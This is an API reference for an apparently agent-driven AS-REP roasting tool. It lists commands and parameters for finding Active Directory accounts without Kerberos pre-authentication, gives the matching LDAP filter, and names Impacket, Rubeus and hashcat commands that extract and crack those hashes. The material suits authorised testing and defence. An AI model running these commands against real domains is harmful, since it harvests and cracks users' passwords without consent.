<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
# performing-as-rep-roasting — API Reference

## Agent Script

| Command | Description |
|---------|-------------|
| `enumerate --domain <fqdn> --dc-ip <ip>` | Find accounts without pre-authentication |
| `crack --hash-file <path>` | Crack extracted AS-REP hashes |
| `analyze --domain <fqdn> --dc-ip <ip>` | Analyze results and map privileges |

## Parameters

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `--domain` | string | Yes | Target AD domain FQDN |
| `--dc-ip` | string | Yes | Domain controller IP address |
| `--users-file` | string | No | Username wordlist for unauthenticated enumeration |
| `--hash-file` | string | Yes (crack) | Path to AS-REP hash file |
| `--wordlist` | string | No | Wordlist path (default: rockyou.txt) |

## Output Schema

```json
{
  "action": "enumerate",
  "domain": "corp.local",
  "ldap_filter": "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
  "status": "enumeration_configured"
}
```

## External Tool Reference

| Tool | Command | Purpose |
|------|---------|---------|
| Impacket | `impacket-GetNPUsers <domain>/ -usersfile users.txt` | Extract AS-REP hashes |
| Rubeus | `Rubeus.exe asreproast /format:hashcat` | Windows AS-REP roasting |
| hashcat | `hashcat -m 18200 hashes.txt wordlist.txt` | Crack AS-REP etype 23 |
